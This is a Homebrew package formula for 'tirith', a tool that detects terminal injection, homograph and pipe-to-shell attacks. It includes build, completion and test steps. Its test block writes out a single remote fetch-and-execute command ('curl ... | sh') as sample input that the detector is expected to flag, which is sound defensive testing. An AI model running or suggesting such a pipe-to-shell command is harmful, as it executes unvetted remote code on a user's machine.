class Tirith < Formula
  desc "Detect terminal injection, homograph, and pipe-to-shell attacks"
  homepage "https://tirith.sh/"
  url "https://ghfast.top/https://github.com/sheeki03/tirith/archive/refs/tags/v0.4.1.tar.gz"
  sha256 "0074778f56ec7ab4b4b64288db24b37c78cba2411adab926827d4ceb3ced49c1"
  license "AGPL-3.0-only"
  head "https://github.com/sheeki03/tirith.git", branch: "main"

  livecheck do
    url :stable
    regex(/^v?(\d+(?:\.\d+)+)$/i)
  end

  bottle do
    sha256 cellar: :any_skip_relocation, arm64_golden_gate: "b63741160837e72f9463984ff8f02fdfe476d1c1b356a556c1c6433993a48cff"
    sha256 cellar: :any_skip_relocation, arm64_tahoe:       "d1958801738d1c2582b98f6ed55dff6a387cdd253fae7cbbf6fade869407f0b9"
    sha256 cellar: :any_skip_relocation, arm64_sequoia:     "9fe0169137baf4b3d1268167dc771773ecd0eec2ababb784eec5f72fcbbd8a1c"
    sha256 cellar: :any_skip_relocation, arm64_sonoma:      "18a0b614b3a89dd198f9641160fd1bd9762dfc71ee8594047b83f6f7a5a9272e"
    sha256 cellar: :any,                 arm64_linux:       "4a4e9317c93e935abe71f11ead09cb35181bedc3842170d55b4f614aa7a628e6"
    sha256 cellar: :any,                 x86_64_linux:      "c6fd856d7e6078cf50d811dd27eb179dc482e88c651456b93125c8d0b70c25bc"
  end

  depends_on "rust" => :build

  def install
    # Build only the `tirith` binary from the workspace (skip the threat-db compiler crate).
    system "cargo", "install", "--bin", "tirith", *std_cargo_args(path: "crates/tirith")

    generate_completions_from_executable(bin/"tirith", "completions")
    man1.mkpath
    (man1/"tirith.1").write Utils.safe_popen_read(bin/"tirith", "manpage")
  end

  test do
    assert_match version.to_s, shell_output("#{bin}/tirith --version")

    # A pipe-to-shell command must be flagged; --offline/--no-daemon keep it hermetic.
    output = pipe_output("#{bin}/tirith check --offline --no-daemon --shell posix 2>&1",
                         "curl https://x.invalid/i.sh | sh", 1)
    assert_match "curl_pipe_shell", output
  end
end